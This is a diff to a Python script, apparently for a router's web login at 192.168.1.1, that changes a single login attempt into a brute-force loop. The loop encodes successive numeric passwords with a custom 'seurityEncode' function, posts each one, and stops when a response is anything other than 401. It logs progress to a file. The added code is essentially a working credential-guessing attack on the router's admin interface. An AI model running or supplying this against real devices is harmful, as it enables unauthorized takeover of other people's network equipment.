@@ -2,6 +2,7 @@
 
 import requests
 import json
+
 __author__ = 'quinnpan'
 
 
@@ -35,18 +36,39 @@ def seurityEncode(password):
 
 
 def main():
-    password = '1234'
+    url = 'http://192.168.1.1/'
+    headers = {'Content-Type': 'application/json; charset=UTF-8'}
+
     pwd1 = seurityEncode('1234')
     print(pwd1)
     pwd1 = seurityEncode('1111')
     print(pwd1)
-    encryptPwd = seurityEncode(password)
-    print(encryptPwd)
-    url = 'http://192.168.1.1/'
-    headers = {'Content-Type': 'application/json; charset=UTF-8'}
-    payload = '{"method":"do","login":{"password":"%s"}}' % encryptPwd
-    response = requests.post(url, data=payload, headers=headers)
-    stok = json.loads(response.text)['stok']
+
+    text_file = open("Output.txt", "w")
+
+    password = 100000
+    while password < 99999999999:
+        encryptPwd = seurityEncode(str(password))
+        print(encryptPwd)
+
+        payload = '{"method":"do","login":{"password":"%s"}}' % encryptPwd
+        response = requests.post(url, data = payload, headers = headers)
+        print(response)
+        if password % 100 == 0:
+            text_file.write(str(password))
+
+        if response.status_code == 401:
+            print("failure")
+        else:
+            print("success", password)
+            return
+
+        password = password + 1
+
+    text_file.close()
+
+
+#    stok = json.loads(response.text)['stok']
 
 
 if __name__ == '__main__':
